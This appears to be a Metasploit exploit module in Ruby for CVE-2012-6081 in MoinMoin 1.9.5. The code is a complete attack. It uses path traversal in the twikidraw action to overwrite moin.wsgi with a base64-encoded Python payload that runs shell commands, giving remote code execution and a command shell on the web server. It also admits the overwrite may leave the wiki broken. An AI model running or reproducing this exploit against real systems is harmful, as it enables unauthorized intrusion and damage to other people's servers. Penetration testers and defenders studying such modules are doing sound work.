# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;MoinMoin twikidraw Action Traversal File Upload&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability
        exists on the manage of the twikidraw actions, where a traversal path can be used
        in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi
        configurations by overwriting moin.wsgi, which allows to execute arbitrary python
        code, as exploited in the wild on July, 2012. The user is warned to use this module
        at his own risk since it&#039;s going to overwrite the moin.wsgi file, required for the
        correct working of the MoinMoin wiki. While the exploit will try to restore the
        attacked application at post exploitation, correct working after all isn&#039;t granted.
      },
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # Vulnerability discovery
          &#039;HTP&#039;, # PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-6081&#039; ],
          [ &#039;OSVDB&#039;, &#039;88825&#039; ],
          [ &#039;BID&#039;, &#039;57082&#039; ],
          [ &#039;EDB&#039;, &#039;25304&#039; ],
          [ &#039;URL&#039;, &#039;http://hg.moinmo.in/moin/1.9/rev/7e7e1cbb9d3f&#039; ],
          [ &#039;URL&#039;, &#039;http://wiki.python.org/moin/WikiAttack2013&#039; ]
        ],
      &#039;Privileged&#039;     => false, # web server context
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 16384, # Enough one to fit any payload
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic telnet netcat perl&#039;
            }
        },
      &#039;Platform&#039;       => [ &#039;unix&#039; ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[ &#039;MoinMoin 1.9.5&#039;, { }]],
      &#039;DisclosureDate&#039; => &#039;Dec 30 2012&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "MoinMoin base path", "/" ]),
        OptString.new(&#039;WritablePage&#039;, [ true, "MoinMoin Page with edit permissions to inject the payload, by default WikiSandbox (Ex: /WikiSandbox)", "/WikiSandBox" ]),
        OptString.new(&#039;USERNAME&#039;, [ false,  "The user to authenticate as (anonymous if username not provided)"]),
        OptString.new(&#039;PASSWORD&#039;, [ false,  "The password to authenticate with (anonymous if password not provided)" ])
      ], self.class)
  end

  def moinmoin_template(path)
    template =[]
    template << "# -*- coding: iso-8859-1 -*-"
    template << "import sys, os"
    template << "sys.path.insert(0, &#039;PATH&#039;)".gsub(/PATH/, File.dirname(path))
    template << "from MoinMoin.web.serving import make_application"
    template << "application = make_application(shared=True)"
    return template
  end

  def restore_file(session, file, contents)
    first = true
    contents.each {|line|
      if first
        session.shell_command_token("echo \"#{line}\" > #{file}")
        first = false
      else
        session.shell_command_token("echo \"#{line}\" >> #{file}")
      end
    }
  end

  # Try to restore a basic moin.wsgi file with the hope of making the
  # application usable again.
  # Try to search on /usr/local/share/moin (default search path) and the
  # current path (apache user home). Avoiding to search on "/" because it
  # could took long time to finish.
  def on_new_session(session)
    print_status("Trying to restore moin.wsgi...")
    begin
      files = session.shell_command_token("find `pwd` -name moin.wsgi 2> /dev/null")
      files.split.each { |file|
        print_status("#{file} found! Trying to restore...")
        restore_file(session, file, moinmoin_template(file))
      }

      files = session.shell_command_token("find /usr/local/share/moin -name moin.wsgi 2> /dev/null")
      files.split.each { |file|
        print_status("#{file} found! Trying to restore...")
        restore_file(session, file, moinmoin_template(file))
      }
      print_warning("Finished. If application isn&#039;t usable, manual restore of the moin.wsgi file would be required.")
    rescue
      print_warning("Error while restring moin.wsgi, manual restoring would be required.")
    end
  end

  def do_login(username, password)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(@base, @page),
      &#039;vars_post&#039; =>
        {
          &#039;action&#039; => &#039;login&#039;,
          &#039;name&#039; => username,
          &#039;password&#039; => password,
          &#039;login&#039; => &#039;Login&#039;
        }
      })

    if not res or res.code != 200 or not res.headers.include?(&#039;Set-Cookie&#039;)
      return nil
    end

    return res.get_cookies

  end

  def upload_code(session, code)

    vprint_status("Retrieving the ticket...")

    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(@base, @page),
      &#039;cookie&#039;   => session,
      &#039;vars_get&#039; => {
        &#039;action&#039; => &#039;twikidraw&#039;,
        &#039;do&#039;     => &#039;modify&#039;,
        &#039;target&#039; => &#039;../../../../moin.wsgi&#039;
      }
    })

    if not res or res.code != 200 or res.body !~ /ticket=(.*?)&target/
      vprint_error("Error retrieving the ticket")
      return nil
    end

    ticket = $1
    vprint_good("Ticket found: #{ticket}")

    my_payload = "[MARK]#{code}[MARK]"
    post_data = Rex::MIME::Message.new
    post_data.add_part("drawing.r if()else[]\nexec eval(\"open(__file__)\\56read()\\56split(&#039;[MARK]&#039;)[-2]\\56strip(&#039;\\\\0&#039;)\")", nil, nil, "form-data; name=\"filename\"")
    post_data.add_part(my_payload, "image/png", nil, "form-data; name=\"filepath\"; filename=\"drawing.png\"")
    my_data = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(@base, @page),
      &#039;cookie&#039;   => session,
      &#039;vars_get&#039; =>
      {
        &#039;action&#039; => &#039;twikidraw&#039;,
        &#039;do&#039;     => &#039;save&#039;,
        &#039;ticket&#039; => ticket,
        &#039;target&#039; => &#039;../../../../moin.wsgi&#039;
      },
      &#039;data&#039;     => my_data,
      &#039;ctype&#039;    => "multipart/form-data; boundary=#{post_data.bound}"
    })

    if not res or res.code != 200 or not res.body.empty?
      vprint_error("Error uploading the payload")
      return nil
    end

    return true
  end

  def check
    @base = target_uri.path
    @base << &#039;/&#039; if @base[-1, 1] != &#039;/&#039;

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(@base)
    })

    if res and res.code == 200 and res.body =~ /moinmoin/i and res.headers[&#039;Server&#039;] =~ /Apache/
      return Exploit::CheckCode::Detected
    elsif res
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Safe
  end

  def writable_page?(session)

    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(@base, @page),
      &#039;cookie&#039; => session,
    })

    if not res or res.code != 200 or res.body !~ /Edit \(Text\)/
      return false
    end

    return true
  end


  def exploit

    # Init variables
    @page = datastore[&#039;WritablePage&#039;]

    @base = target_uri.path
    @base << &#039;/&#039; if @base[-1, 1] != &#039;/&#039;

    # Login if needed
    if (datastore[&#039;USERNAME&#039;] and
      not datastore[&#039;USERNAME&#039;].empty? and
      datastore[&#039;PASSWORD&#039;] and
      not datastore[&#039;PASSWORD&#039;].empty?)
      print_status("Trying login to get session ID...")
      session = do_login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    else
      print_status("Using anonymous access...")
      session = ""
    end

    # Check authentication
    if not session
      fail_with(Exploit::Failure::NoAccess, "Error getting a session ID, check credentials or WritablePage option")
    end

    # Check writable permissions
    if not writable_page?(session)
      fail_with(Exploit::Failure::NoAccess, "There are no write permissions on #{@page}")
    end

    # Upload payload
    print_status("Trying to upload payload...")
    python_cmd = "import os\nos.system(\"#{Rex::Text.encode_base64(payload.encoded)}\".decode(\"base64\"))"
    res = upload_code(session, "exec(&#039;#{Rex::Text.encode_base64(python_cmd)}&#039;.decode(&#039;base64&#039;))")
    if not res
      fail_with(Exploit::Failure::Unknown, "Error uploading the payload")
    end

    # Execute payload
    print_status("Executing the payload...")
    res = send_request_cgi({
      &#039;uri&#039;      => normalize_uri(@base, @page),
      &#039;cookie&#039; => session,
      &#039;vars_get&#039; => {
        &#039;action&#039; => &#039;AttachFile&#039;
      }
    }, 5)

  end

end

